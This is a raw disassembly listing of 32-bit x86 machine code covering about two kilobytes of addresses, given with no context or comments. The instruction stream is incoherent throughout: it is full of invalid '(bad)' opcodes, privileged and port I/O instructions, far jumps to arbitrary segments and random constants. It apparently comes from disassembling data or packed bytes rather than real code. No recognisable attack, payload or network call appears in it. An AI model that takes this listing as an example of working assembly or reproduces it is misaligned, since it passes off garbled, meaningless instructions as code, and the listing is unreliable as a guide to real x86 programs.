  422d8f:	mov    dh,0x63
  422d91:	and    BYTE PTR [esi],cl
  422d93:	pop    esi
  422d94:	inc    ecx
  422d95:	cmp    DWORD PTR [ecx+0x4ce6fb3e],ebx
  422d9b:	inc    edx
  422d9c:	and    DWORD PTR ds:0xbcaa229,ebx
  422da2:	mov    edx,0x84c2c5cf
  422da7:	push   ebp
  422da8:	cwde   
  422da9:	loope  0x422dc7
  422dab:	jns    0x422db5
  422dad:	retf   
  422dae:	jle    0x422d83
  422db0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422db1:	mov    dl,0x40
  422db3:	add    bh,BYTE PTR [edx+0x49]
  422db6:	rcl    bl,cl
  422db8:	and    esi,DWORD PTR [ebp-0x13]
  422dbb:	add    BYTE PTR [edx-0xa],ah
  422dbe:	aad    0x29
  422dc0:	stc    
  422dc1:	xchg   ebx,eax
  422dc2:	pop    esp
  422dc3:	mov    bl,0xb7
  422dc5:	cwde   
  422dc6:	loope  0x422e34
  422dc8:	jmp    0x9e8f:0xc51aeeca
  422dcf:	or     dl,dh
  422dd1:	xor    ebp,DWORD PTR [ecx]
  422dd3:	dec    ebp
  422dd4:	icebp  
  422dd5:	in     eax,dx
  422dd6:	and    bl,dh
  422dd8:	xor    eax,0xa693cae1
  422ddd:	mov    dh,dl
  422ddf:	ret    0x330d
  422de2:	(bad)  
  422de3:	push   edi
  422de4:	dec    ebx
  422de5:	sbb    BYTE PTR [edi+edx*8],bl
  422de8:	add    ah,BYTE PTR [esi-0xe]
  422deb:	or     ecx,edx
  422ded:	mov    ebp,0xb25a58d5
  422df2:	add    eax,DWORD PTR [edx]
  422df4:	test   BYTE PTR [ecx-0xf8ef6e3],dh
  422dfa:	inc    ecx
  422dfb:	rol    BYTE PTR [edx-0xd61265e],0x17
  422e02:	sti    
  422e03:	inc    edx
  422e04:	add    al,0xce
  422e06:	xchg   edi,eax
  422e07:	cmc    
  422e08:	xor    ch,dh
  422e0a:	or     DWORD PTR [esi+0x37],0xffffffef
  422e0e:	test   al,0xcf
  422e10:	js     0x422e0e
  422e12:	push   0x2386e683
  422e17:	push   ecx
  422e18:	sahf   
  422e19:	and    dh,BYTE PTR [edi-0x37]
  422e1c:	jl     0x422e2c
  422e1e:	mov    dl,0x6
  422e20:	jmp    0xfbff:0xf558979
  422e27:	shl    DWORD PTR [eax],cl
  422e29:	xor    BYTE PTR [esi-0x11],al
  422e2c:	scas   eax,DWORD PTR es:[edi]
  422e2d:	add    DWORD PTR [eax],eax
  422e2f:	outs   dx,BYTE PTR ds:[esi]
  422e30:	idiv   DWORD PTR [ebx-0x1924497]
  422e36:	test   DWORD PTR [ebp+0x21153db3],0xe31b4f05
  422e40:	test   al,0x1
  422e42:	add    bh,ah
  422e44:	add    DWORD PTR [eax],eax
  422e46:	add    BYTE PTR [ecx+0x5a7c0405],ch
  422e4c:	fidiv  WORD PTR [ebp-0x53b54bbb]
  422e52:	imul   ebp,DWORD PTR [eax],0x6aafb36f
  422e58:	test   BYTE PTR [edi-0x605e9b2b],dh
  422e5e:	sbb    BYTE PTR [ecx+0x57],ch
  422e61:	cmp    DWORD PTR [esi],edi
  422e63:	cwde   
  422e64:	cdq    
  422e65:	add    ah,bh
  422e67:	ffree  st(3)
  422e69:	idiv   BYTE PTR [esi+0x714899d6]
  422e6f:	cmc    
  422e70:	pop    es
  422e71:	mov    edi,0x8b2bf609
  422e76:	cdq    
  422e77:	scas   eax,DWORD PTR es:[edi]
  422e78:	dec    ebp
  422e79:	shl    dh,cl
  422e7b:	js     0x422e0e
  422e7d:	cld    
  422e7e:	xchg   esp,eax
  422e7f:	stc    
  422e80:	mov    bl,0x77
  422e82:	enter  0xa959,0xba
  422e86:	pop    ebx
  422e87:	push   edi
  422e88:	mov    eax,ds:0x875a574e
  422e8d:	add    ebp,eax
  422e8f:	push   edi
  422e90:	cli    
  422e91:	ficomp DWORD PTR [edi]
  422e93:	fisub  DWORD PTR [esi]
  422e95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e96:	jl     0x422e47
  422e98:	jb     0x422e5c
  422e9a:	inc    edx
  422e9b:	sub    DWORD PTR [eax+0x7f],esi
  422e9e:	pop    edi
  422e9f:	ret    
  422ea0:	push   cs
  422ea1:	add    eax,DWORD PTR [esp+edi*4]
  422ea4:	adc    DWORD PTR [ecx],esi
  422ea6:	inc    edi
  422ea7:	mov    ch,0x8e
  422ea9:	popf   
  422eaa:	leave  
  422eab:	mov    dh,BYTE PTR [eax]
  422ead:	mov    dl,0x7a
  422eaf:	fwait
  422eb0:	bound  ebp,QWORD PTR [ebp+0x6c370930]
  422eb6:	scas   al,BYTE PTR es:[edi]
  422eb7:	push   ds
  422eb8:	arpl   WORD PTR [ebp-0x2ae1fb40],di
  422ebe:	aam    0xc1
  422ec0:	mov    bl,BYTE PTR gs:[esp+edi*4-0x7ffb125d]
  422ec8:	and    DWORD PTR [edx],0x39433817
  422ece:	fmul   QWORD PTR [ebx+esi*2+0x1296368f]
  422ed5:	hlt    
  422ed6:	pop    ebx
  422ed7:	shl    BYTE PTR [eax-0x2e234ef8],cl
  422edd:	push   es
  422ede:	shl    bl,1
  422ee0:	jmp    0x422e86
  422ee2:	test   al,0x8f
  422ee4:	or     eax,0x3f7044b9
  422ee9:	pop    ss
  422eea:	jo     0x422ed3
  422eec:	jg     0x422ee4
  422eee:	repnz test DWORD PTR gs:[esi],0x3359e35a
  422ef6:	pop    edi
  422ef7:	add    bl,BYTE PTR [edi]
  422ef9:	repnz mov eax,ds:0x7d53eea
  422eff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f00:	(bad)  
  422f01:	mov    bh,0x94
  422f03:	pop    es
  422f04:	iret   
  422f05:	sub    BYTE PTR [esi],dl
  422f07:	out    0xf2,al
  422f09:	cmp    DWORD PTR ds:0xc090db9a,0xffffffc5
  422f10:	mov    esp,0x89dcdc57
  422f15:	mov    bh,0xe8
  422f17:	std    
  422f18:	sub    eax,0xeb4339a1
  422f1d:	jp     0x422f10
  422f1f:	and    eax,0x88d9adb
  422f24:	push   esi
  422f25:	adc    al,0xa0
  422f27:	fst    DWORD PTR [ecx-0x7c]
  422f2a:	push   edi
  422f2b:	inc    edi
  422f2c:	mov    ah,0x8a
  422f2e:	idiv   DWORD PTR [ebp+0x7b]
  422f31:	inc    ebp
  422f32:	aad    0x4e
  422f34:	mov    cl,0x46
  422f36:	sbb    DWORD PTR [ebx],eax
  422f38:	test   BYTE PTR [edi],ch
  422f3a:	jmp    0x73ab:0xd5634dc4
  422f41:	adc    DWORD PTR [esi],0x3b035afd
  422f47:	xchg   esp,eax
  422f48:	push   es
  422f49:	(bad)  
  422f4a:	pop    esi
  422f4b:	outs   dx,DWORD PTR ds:[esi]
  422f4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f4d:	clc    
  422f4e:	popa   
  422f4f:	aaa    
  422f50:	jo     0x422f77
  422f52:	call   0x2247:0x8f85b044
  422f59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f5a:	pushf  
  422f5b:	jns    0x422fce
  422f5d:	mov    edx,0xd44350b4
  422f62:	popf   
  422f63:	out    0x15,eax
  422f65:	outs   dx,DWORD PTR ds:[esi]
  422f66:	in     al,0xd6
  422f68:	shl    BYTE PTR [edx],cl
  422f6a:	dec    esp
  422f6b:	retf   
  422f6c:	or     BYTE PTR [ebp-0x32],dh
  422f6f:	(bad)  
  422f70:	mov    DWORD PTR [esi+0x41],ebx
  422f73:	cmp    eax,0xbe39d441
  422f78:	cmp    eax,ecx
  422f7a:	sub    BYTE PTR [ebx],al
  422f7c:	test   al,0x7b
  422f7e:	push   esp
  422f7f:	fldcw  WORD PTR [edi-0x2f533b7f]
  422f85:	mov    ebx,0x5853cab9
  422f8a:	in     eax,0xfb
  422f8c:	xor    esp,DWORD PTR [edx]
  422f8e:	gs mov dl,0x6c
  422f91:	out    dx,al
  422f92:	aam    0x80
  422f94:	pop    es
  422f95:	xlat   BYTE PTR ds:[ebx]
  422f96:	inc    edi
  422f97:	push   ecx
  422f98:	push   ecx
  422f99:	popf   
  422f9a:	mov    esi,0x41dc0f42
  422f9f:	dec    ch
  422fa1:	mov    dh,0x38
  422fa3:	mov    ebp,0x9fb85031
  422fa8:	pop    esp
  422fa9:	jl     0x422fcd
  422fab:	add    ebx,ecx
  422fad:	cmp    DWORD PTR ds:0xd3b87b07,edi
  422fb3:	or     al,0xf5
  422fb5:	dec    eax
  422fb6:	sub    DWORD PTR [esi-0x53],eax
  422fb9:	or     dl,ch
  422fbb:	xor    edi,DWORD PTR [ebp-0x13e270be]
  422fc1:	pop    ecx
  422fc2:	aaa    
  422fc3:	in     ax,0x28
  422fc6:	in     eax,dx
  422fc7:	cmp    eax,0x47a4bea3
  422fcc:	fiadd  DWORD PTR [esi]
  422fce:	cld    
  422fcf:	loop   0x422fcf
  422fd1:	mov    ds:0xca9393ef,al
  422fd6:	fcom   DWORD PTR [ebx+ebp*1+0x3580792a]
  422fdd:	pop    ebp
  422fde:	fcomi  st,st(1)
  422fe0:	mov    esp,0x393c605b
  422fe5:	cmp    cl,bh
  422fe7:	fcom   DWORD PTR [edi-0x75bb212c]
  422fed:	mov    DWORD PTR [edi+0xe3df152],esp
  422ff3:	scas   al,BYTE PTR es:[edi]
  422ff4:	sub    eax,0x23912134
  422ff9:	sbb    al,0xf8
  422ffb:	mov    ds:0x2f2bcb12,al
  423000:	inc    esp
  423001:	stos   BYTE PTR es:[edi],al
  423002:	or     ebx,DWORD PTR [edi-0x2d]
  423005:	jb     0x423066
  423007:	push   edi
  423008:	mov    WORD PTR [esi],fs
  42300a:	pop    edx
  42300b:	retf   
  42300c:	or     BYTE PTR [esi+0x2a9cdff6],bl
  423012:	sbb    ah,BYTE PTR [edx+0x296f4c4d]
  423018:	xchg   ecx,eax
  423019:	(bad)  
  42301a:	mov    ah,BYTE PTR [edx+0x6c]
  42301d:	(bad)  
  42301e:	dec    esp
  42301f:	nop
  423020:	xor    DWORD PTR es:[esi+ebp*1],eax
  423024:	add    eax,0x3f023d19
  423029:	cmp    BYTE PTR ds:0x48326f,al
  42302f:	sub    eax,0xfffb5fc4
  423034:	sti    
  423035:	lods   eax,DWORD PTR ds:[esi]
  423036:	(bad)  
  423037:	xchg   ecx,eax
  423038:	loop   0x422fc2
  42303a:	xchg   edx,eax
  42303b:	aaa    
  42303c:	fsub   DWORD PTR [edi+0x69]
  42303f:	retf   0x1aa
  423042:	add    bh,ah
  423044:	add    DWORD PTR [eax],eax
  423046:	add    BYTE PTR [eax-0x2fcadb11],cl
  42304c:	aaa    
  42304d:	add    BYTE PTR [edi+0x4f11adaa],dh
  423053:	dec    esi
  423054:	sub    bl,bh
  423056:	retf   
  423057:	test   al,0x43
  423059:	idiv   BYTE PTR [ebx+0x3c]
  42305c:	xchg   ebp,eax
  42305d:	ins    DWORD PTR es:[edi],dx
  42305e:	cmp    esp,0xdc392d41
  423064:	mov    BYTE PTR [eax+eiz*4],dl
  423067:	in     eax,dx
  423068:	out    dx,al
  423069:	fsub   QWORD PTR [ebx]
  42306b:	loope  0x4230bd
  42306d:	aam    0x85
  42306f:	mov    ds:0x4ffd4a3d,al
  423074:	stc    
  423075:	stos   DWORD PTR es:[edi],eax
  423076:	xor    esp,edx
  423078:	mov    ch,0x72
  42307a:	or     eax,0x30f94b86
  42307f:	dec    ebx
  423080:	cwde   
  423081:	mov    bl,0x2b
  423083:	xchg   esi,eax
  423084:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423085:	inc    ecx
  423086:	test   al,0x4d
  423088:	aam    0x47
  42308a:	mov    cl,0x9e
  42308c:	shr    DWORD PTR [ecx+eiz*8-0x1e],0xc5
  423091:	shl    ah,cl
  423093:	xor    DWORD PTR [esi-0x15],0x31
  423097:	lea    ebx,[edx]
  423099:	outs   dx,DWORD PTR ds:[esi]
  42309a:	aad    0xc2
  42309c:	cwde   
  42309d:	push   cs
  42309e:	or     DWORD PTR [ebx-0x75806f7e],0x3c
  4230a5:	stc    
  4230a6:	in     eax,dx
  4230a7:	jno    0x423076
  4230a9:	jp     0x4230b3
  4230ab:	fmul   DWORD PTR [edi]
  4230ad:	mov    edx,0x70cf105d
  4230b2:	pop    edi
  4230b3:	xchg   ebx,eax
  4230b4:	mov    ebp,0xfebd619b
  4230b9:	imul   ecx,DWORD PTR [edx+ecx*1],0x12
  4230bd:	dec    ebp
  4230be:	mov    dh,0xa2
  4230c0:	std    
  4230c1:	out    dx,al
  4230c2:	pop    edx
  4230c3:	mov    bl,0x95
  4230c5:	dec    edx
  4230c6:	xor    esi,ecx
  4230c8:	bound  ebx,QWORD PTR [ebx]
  4230ca:	in     al,0x44
  4230cc:	test   BYTE PTR [ebx+0x63],ah
  4230cf:	lods   al,BYTE PTR ds:[esi]
  4230d0:	rol    BYTE PTR [edx],cl
  4230d2:	iret   
  4230d3:	xchg   edx,eax
  4230d4:	jb     0x4230f0
  4230d6:	cmp    DWORD PTR [ebp+0x2ef65aae],edi
  4230dc:	jmp    0xb64cc08b
  4230e1:	pop    ss
  4230e2:	xchg   esp,eax
  4230e3:	(bad)  
  4230e4:	mov    esp,0x76830ff5
  4230e9:	ins    BYTE PTR es:[edi],dx
  4230ea:	xlat   BYTE PTR ds:[ebx]
  4230eb:	and    esp,DWORD PTR [esi-0x76]
  4230ee:	mov    WORD PTR [esi+0x78],?
  4230f1:	cmp    bl,BYTE PTR [ebp+0x3f]
  4230f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230f5:	daa    
  4230f6:	not    BYTE PTR [edi]
  4230f8:	pop    ebp
  4230f9:	(bad)  
  4230fa:	fucom  st(0)
  4230fc:	cmp    esi,edi
  4230fe:	jg     0x4230dc
  423100:	test   eax,0x3fd2ba22
  423105:	(bad)  
  423106:	je     0x4230ec
  423108:	fidiv  DWORD PTR [ecx]
  42310a:	hlt    
  42310b:	mov    edx,0x43e9e2f1
  423110:	(bad)  
  423111:	fdiv   QWORD PTR [eax+0x52d5c87c]
  423117:	(bad)  
  423118:	ds enter 0x2489,0xb8
  42311d:	aaa    
  42311e:	cmp    al,0xb8
  423120:	pop    edi
  423121:	push   es
  423122:	adc    eax,edi
  423124:	outs   dx,DWORD PTR ds:[esi]
  423125:	push   edx
  423126:	sbb    eax,0xe770adc3
  42312b:	fild   WORD PTR [ebp+eiz*1-0x36310c09]
  423132:	xor    dl,BYTE PTR [esi-0x17]
  423135:	or     eax,0xd0e72523
  42313a:	push   esp
  42313b:	pop    ecx
  42313c:	inc    edx
  42313d:	sub    al,0x2b
  42313f:	(bad)  
  423140:	and    DWORD PTR [ecx+0x63],esi
  423143:	mov    ecx,0xe6b263c8
  423148:	xor    bl,BYTE PTR [ebx-0x1d38ccaa]
  42314e:	ja     0x423181
  423150:	xchg   edi,eax
  423151:	shl    DWORD PTR [eax],1
  423153:	jl     0x423181
  423155:	shl    WORD PTR [esi],1
  423158:	imul   esi,DWORD PTR [esi+0x23],0xe7ac8bc8
  42315f:	push   cs
  423160:	xchg   ebx,eax
  423161:	imul   edx,ecx,0x4d
  423164:	aam    0xf2
  423166:	mov    ah,0xd4
  423168:	ret    
  423169:	mov    ebx,0x9d14369b
  42316e:	add    BYTE PTR [eax+0x3c],ch
  423171:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423172:	(bad)  
  423173:	addr16 jg 0x42314f
  423176:	jge    0x42313e
  423178:	pop    ds
  423179:	add    eax,DWORD PTR [esi-0x18]
  42317c:	das    
  42317d:	mov    ecx,0x39f41f9e
  423182:	cs (bad) 
  423184:	fdiv   DWORD PTR [ecx-0x6e348c0c]
  42318a:	mov    edx,0xdba2d31e
  42318f:	jae    0x423117
  423191:	mov    esp,0xdb7b6b29
  423196:	xchg   ecx,eax
  423197:	in     al,0x4c
  423199:	xor    eax,0xbab041df
  42319e:	popf   
  42319f:	cmp    DWORD PTR [esi],0xffffffe6
  4231a2:	fidivr WORD PTR [esi-0x595b6522]
  4231a8:	js     0x4231e7
  4231aa:	pop    es
  4231ab:	repnz (bad) 
  4231ad:	sbb    al,BYTE PTR [esi]
  4231af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231b0:	mov    dl,0x31
  4231b2:	and    eax,0x47b1c9b0
  4231b7:	mov    al,ds:0xf2f5070e
  4231bc:	fistp  QWORD PTR [ebx]
  4231be:	push   cs
  4231bf:	mov    eax,0xe003ff76
  4231c4:	xchg   esp,eax
  4231c5:	xchg   edi,eax
  4231c6:	adc    DWORD PTR [ecx+0x6b97048f],ebx
  4231cc:	and    DWORD PTR [edx-0x15868776],0x61b7ef38
  4231d6:	mov    cl,0x3a
  4231d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231d9:	dec    eax
  4231da:	inc    esi
  4231db:	xchg   ecx,eax
  4231dc:	mov    ebp,0x34781661
  4231e1:	dec    edi
  4231e2:	adc    edi,edi
  4231e4:	push   esi
  4231e5:	ins    DWORD PTR es:[edi],dx
  4231e6:	mov    ds:0xb54d90fb,al
  4231eb:	mov    ds:0x13a55811,eax
  4231f0:	es movaps xmm5,xmm5
  4231f4:	dec    esp
  4231f5:	sub    BYTE PTR [eax+0x5e],al
  4231f8:	icebp  
  4231f9:	xchg   edi,eax
  4231fa:	sbb    al,dh
  4231fc:	add    ebp,edi
  4231fe:	adc    BYTE PTR [esi],al
  423200:	add    DWORD PTR [ebx-0xd1e50bd],edx
  423206:	xor    al,0x66
  423208:	adc    eax,0xace307d4
  42320d:	dec    ebp
  42320e:	sbb    DWORD PTR [eax+eax*2-0x4b92ab93],0x7ace43a3
  423219:	mov    ch,0xba
  42321b:	imul   edx,DWORD PTR [edi-0x594c35bf],0xffffffc3
  423222:	scas   eax,DWORD PTR es:[edi]
  423223:	adc    bh,BYTE PTR [ecx]
  423225:	aaa    
  423226:	out    0xc4,eax
  423228:	ret    0x9b71
  42322b:	pop    ebp
  42322c:	call   0xeec:0xc27e0081
  423233:	cld    
  423234:	cs (bad) 
  423236:	repnz cld 
  423238:	std    
  423239:	push   ds
  42323a:	retf   0xe02e
  42323d:	dec    esp
  42323e:	call   0x1e7:0x1acb1
  423245:	add    BYTE PTR [eax],al
  423247:	pop    esi
  423248:	out    0xc1,al
  42324a:	xor    BYTE PTR [esi-0x5a],dl
  42324d:	iret   
  42324e:	rol    esi,0x40
  423251:	loop   0x42325d
  423253:	jecxz  0x423214
  423255:	gs ret 
  423257:	jno    0x423226
  423259:	push   ebp
  42325a:	out    dx,al
  42325b:	leave  
  42325c:	data16 (bad) 
  42325f:	retf   0x7fed
  423262:	add    DWORD PTR [esi],esi
  423264:	mov    ds:0xfd0507a0,al
  423269:	mov    eax,0xff3a1e4b
  42326e:	mov    edi,0xdbe01139
  423273:	ins    DWORD PTR es:[edi],dx
  423274:	sbb    BYTE PTR [esi-0x63309164],al
  42327a:	xchg   ebx,eax
  42327b:	aad    0x8b
  42327d:	adc    BYTE PTR [edi-0x4af32f90],bh
  423283:	rol    DWORD PTR [esi-0x66],1
  423286:	(bad)  
  423287:	fisub  WORD PTR [eax+0x40]
  42328a:	es xchg esi,eax
  42328c:	mov    cl,BYTE PTR [ecx+edx*1]
  42328f:	(bad)  
  423290:	out    dx,eax
  423291:	test   al,0x4a
  423293:	pop    es
  423294:	(bad)  
  423295:	fnsave [eax]
  423297:	lock popf 
  423299:	xor    eax,0xe14cf1d1
  42329e:	push   edx
  42329f:	xor    BYTE PTR [ebx+0x6b],bh
  4232a2:	or     BYTE PTR [ebp-0x7fd1e909],ch
  4232a8:	(bad)  
  4232a9:	or     DWORD PTR [eax+0x63fc88d5],esi
  4232af:	(bad)  
  4232b0:	and    al,0x58
  4232b2:	mov    ebp,0x658cb671
  4232b7:	hlt    
  4232b8:	je     0x42331e
  4232ba:	and    dl,0xea
  4232bd:	dec    ecx
  4232be:	js     0x42327c
  4232c0:	mov    edi,0x822af7ea
  4232c5:	loop   0x4232e8
  4232c7:	out    dx,al
  4232c8:	std    
  4232c9:	jl     0x4232b3
  4232cb:	xor    dh,0x8c
  4232ce:	rcl    ch,0x75
  4232d1:	les    esp,FWORD PTR [edx]
  4232d3:	jne    0x423283
  4232d5:	loopne 0x42329c
  4232d7:	add    edx,ebp
  4232d9:	bound  ecx,QWORD PTR [esi-0x49047e76]
  4232df:	mov    bl,0xef
  4232e1:	pop    esp
  4232e2:	and    al,0x4b
  4232e4:	int3   
  4232e5:	inc    ecx
  4232e6:	mov    ah,0x6b
  4232e8:	jmp    0xdaa45409
  4232ed:	(bad)  
  4232ee:	jmp    0x423361
  4232f0:	mov    ebp,0xa7244a8e
  4232f5:	pop    eax
  4232f6:	xchg   edx,eax
  4232f7:	jb     0x423322
  4232f9:	pop    esi
  4232fa:	mov    esp,0x68901387
  4232ff:	jg     0x4232e7
  423301:	pop    ds
  423302:	mov    esp,0x414a2abe
  423307:	push   ebp
  423308:	icebp  
  423309:	ror    DWORD PTR [ecx],1
  42330b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42330c:	out    dx,al
  42330d:	adc    BYTE PTR [eax],dl
  42330f:	push   0x33
  423311:	cmp    edx,DWORD PTR [edi+0x21]
  423314:	push   0x79921275
  423319:	push   cs
  42331a:	mov    edx,0x2a338fb5
  42331f:	push   es
  423320:	add    eax,0x9a29fc1c
  423325:	mov    edi,0x722f5971
  42332a:	jb     0x4232c5
  42332c:	cmp    al,0x5b
  42332e:	jg     0x423324
  423330:	neg    ebp
  423332:	cmp    cl,BYTE PTR [edx]
  423334:	adc    BYTE PTR ds:0xc240b9ab,ah
  42333a:	dec    esp
  42333b:	push   cs
  42333c:	ret    0xabd7
  42333f:	xchg   esp,eax
  423340:	mov    cl,BYTE PTR [esi-0x5e]
  423343:	xlat   BYTE PTR ds:[ebx]
  423344:	fcomp  QWORD PTR [ecx-0x5e51efd2]
  42334a:	xchg   ecx,eax
  42334b:	leave  
  42334c:	push   es
  42334d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42334e:	mov    WORD PTR [eax],ss
  423350:	repz aaa 
  423352:	test   BYTE PTR [edi],dl
  423354:	loop   0x42336d
  423356:	fidivr WORD PTR [ecx]
  423358:	xchg   esp,eax
  423359:	arpl   WORD PTR [edi+0x108299a5],cx
  42335f:	mov    edi,DWORD PTR [ebp-0x74174d18]
  423365:	pushf  
  423366:	retf   
  423367:	xor    eax,0xae0e9296
  42336c:	aaa    
  42336d:	imul   ecx,DWORD PTR [eax],0x595b6967
  423373:	push   cs
  423374:	lock xchg ecx,eax
  423376:	and    ah,bl
  423378:	sub    al,0x5f
  42337a:	or     esp,ebx
  42337c:	mov    ch,BYTE PTR [esi+0x7d]
  42337f:	ja     0x42337d
  423381:	cdq    
  423382:	in     eax,dx
  423383:	ja     0x42339d
  423385:	sub    eax,0xa1e996d3
  42338a:	bound  eax,QWORD PTR [eax+eiz*8-0x28]
  42338e:	push   0xffffffbb
  423390:	not    DWORD PTR [ecx+esi*2+0x75]
  423394:	ss dec ebp
  423396:	fisttp DWORD PTR [ecx+edx*1+0x27ffd9c9]
  42339d:	in     al,dx
  42339e:	scas   al,BYTE PTR es:[edi]
  42339f:	pushf  
  4233a0:	and    eax,0x4065e4c2
  4233a5:	or     bh,0xa0
  4233a8:	(bad)  
  4233aa:	bound  ebx,QWORD PTR [edx-0x130cee65]
  4233b0:	add    eax,0x3be62d29
  4233b5:	pushf  
  4233b6:	sub    al,0xfc
  4233b8:	fsubr  st(4),st
  4233ba:	xlat   BYTE PTR ds:[ebx]
  4233bc:	sahf   
  4233bd:	push   esi
  4233be:	ret    0xfe33
  4233c1:	cdq    
  4233c2:	mov    ds:0xbc5a9fba,al
  4233c7:	push   edi
  4233c8:	cmp    BYTE PTR [edx+0x113cc86e],ah
  4233ce:	bound  edx,QWORD PTR [edi-0x213e09d5]
  4233d4:	clc    
  4233d5:	bound  edi,QWORD PTR [ebx-0x199007be]
  4233db:	js     0x42343c
  4233dd:	loopne 0x42344f
  4233df:	jns    0x4233c4
  4233e1:	mov    al,ds:0xfc05b1cf
  4233e6:	jns    0x423400
  4233e8:	mov    ds:0x1874422,al
  4233ed:	inc    esp
  4233ee:	jmp    0x6bc05398
  4233f3:	pop    es
  4233f4:	daa    
  4233f5:	inc    edi
  4233f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233f7:	mov    edx,0x22d5d78a
  4233fc:	mov    ds:0xf3ba084,al
  423401:	gs fs push 0xffffffeb
  423405:	(bad)  
  423407:	xor    BYTE PTR [edx-0x5a],dh
  42340a:	adc    esp,0x5a
  42340d:	jo     0x4233a8
  42340f:	mov    ebx,0xb9d994e9
  423414:	push   ds
  423415:	sub    cl,dh
  423417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423418:	push   edx
  423419:	sbb    al,0xaf
  42341b:	les    edx,FWORD PTR [esi+0x51d6fed5]
  423421:	adc    DWORD PTR [eax],eax
  423423:	sar    esi,1
  423425:	mov    bl,BYTE PTR [ecx]
  423427:	lds    esp,FWORD PTR [ecx+ebx*4]
  42342a:	imul   esp,DWORD PTR [edi-0xa],0x18
  42342e:	add    BYTE PTR [esi-0x37],cl
  423431:	(bad)  [edi+ebx*8+0x5c]
  423435:	(bad)  
  423437:	sbb    eax,0x2e70d97a
  42343c:	adc    bh,bl
  42343e:	dec    esi
  42343f:	cwde   
  423440:	scas   al,BYTE PTR es:[edi]
  423441:	add    DWORD PTR [eax],eax
  423443:	out    0x1,eax
  423445:	add    BYTE PTR [eax],al
  423447:	cmp    esp,DWORD PTR [edx-0x53]
  42344a:	jnp    0x423475
  42344c:	jo     0x423453
  42344e:	pushf  
  42344f:	mov    ebx,0xfabcc961
  423454:	xabort 0x49
  423457:	test   al,dh
  423459:	and    DWORD PTR [ebx+ecx*2-0x19599dcd],0x22
  423461:	in     eax,dx
  423462:	mov    eax,DWORD PTR [ecx]
  423464:	add    ch,BYTE PTR [ebp-0x485ae2c2]
  42346a:	mov    cl,0xdb
  42346c:	sub    bh,ah
  42346e:	les    esi,FWORD PTR [esi]
  423470:	push   ss
  423471:	jb     0x423447
  423473:	ss int3 
  423475:	test   eax,0x974cef76
  42347a:	jo     0x42342a
  42347c:	jl     0x4234c2
  42347e:	test   BYTE PTR [edi+0x35],ch
  423481:	ins    BYTE PTR es:[edi],dx
  423482:	dec    eax
  423483:	pop    esi
  423484:	gs daa 
  423486:	add    eax,0x43eef547
  42348b:	call   DWORD PTR [edx+ecx*8-0x47bcfabc]
  423492:	pop    edx
  423493:	jg     0x423512
  423495:	mov    esi,0x69cd2bc7
  42349a:	aad    0xe6
  42349c:	sbb    edx,DWORD PTR [edi-0x7141f87a]
  4234a2:	pop    ds
  4234a3:	call   0x318140e1
  4234a8:	xchg   ecx,eax
  4234a9:	inc    ebx
  4234aa:	mov    ebx,0xbf790225
  4234af:	lds    ebx,FWORD PTR [edi]
  4234b1:	inc    ecx
  4234b2:	ins    DWORD PTR es:[edi],dx
  4234b3:	ds mov bl,0x3a
  4234b6:	adc    DWORD PTR [eax-0x12955a3d],ecx
  4234bc:	jmp    0x423499
  4234be:	loope  0x42349b
  4234c0:	ins    BYTE PTR es:[edi],dx
  4234c1:	cmp    ebx,DWORD PTR [edi]
  4234c3:	mov    bl,0xfc
  4234c5:	test   eax,0x6547c536
  4234ca:	call   0x80e4:0xea39ad9a
  4234d1:	lds    edi,FWORD PTR [ebx-0xb]
  4234d4:	and    DWORD PTR [ecx-0x1e],ebp
  4234d7:	push   ds
  4234d8:	adc    BYTE PTR [edx-0x7f],ch
  4234db:	or     DWORD PTR [ecx+0x5f],esp
  4234de:	pop    eax
  4234df:	fld    TBYTE PTR [ebx+ecx*4-0xd]
  4234e3:	and    bl,0x3b
  4234e6:	lock mov edx,0x559f1221
  4234ec:	icebp  
  4234ed:	push   0xffffffbf
  4234ef:	in     eax,0xa4
  4234f1:	sahf   
  4234f2:	push   ds
  4234f3:	fmul   QWORD PTR [edx+0x361e85a]
  4234f9:	mov    edi,0x2901f303
  4234fe:	sub    esi,ebp
  423500:	add    BYTE PTR [edx+eiz*4],cl
  423503:	push   ebp
  423504:	sub    cl,bl
  423506:	inc    edi
  423507:	xchg   edi,eax
  423508:	loopne 0x423504
  42350a:	sub    ch,0x4
  42350d:	xchg   esp,eax
  42350e:	adc    eax,0xd9aefa27
  423513:	outs   dx,BYTE PTR ds:[esi]
  423514:	mov    esp,0x91aa9472
  423519:	sbb    ebp,esi
  42351b:	cmp    esi,ecx
  42351d:	fdivr  QWORD PTR [ebx-0x75d4f3eb]
  423523:	lods   eax,DWORD PTR ds:[esi]
  423524:	mov    DWORD PTR [edx-0x4f7aafd4],0xce06b5d5
  42352e:	adc    ebp,ecx
  423530:	add    edx,DWORD PTR [ebp-0x7d6fcae]
  423536:	ret    0x4945
  423539:	jmp    0xb8be1c4d
  42353e:	out    dx,eax
  42353f:	js     0x4234f5
  423541:	pop    edx
  423542:	(bad)  
  423543:	push   edi
  423544:	inc    edi
  423545:	mov    esi,0xaa492032
  42354a:	sub    eax,0xcc7793af
  423550:	push   ecx
  423551:	inc    ebp
  423552:	push   ebp
  423553:	jbe    0x423589
  423555:	daa    
  423556:	xor    DWORD PTR ds:0x77e233a9,ebx
  42355c:	sub    eax,0xdf97e940
  423561:	cmp    ecx,DWORD PTR [ecx+0x5898a6d1]
  423567:	xor    BYTE PTR ds:0xa0fdd7f,al
  42356d:	sbb    al,0xad
  42356f:	stos   DWORD PTR es:[edi],eax
  423570:	cwde   
  423571:	dec    eax
  423572:	mov    ebx,0xdd8ee1ff
  423577:	jmp    0x50a30e6
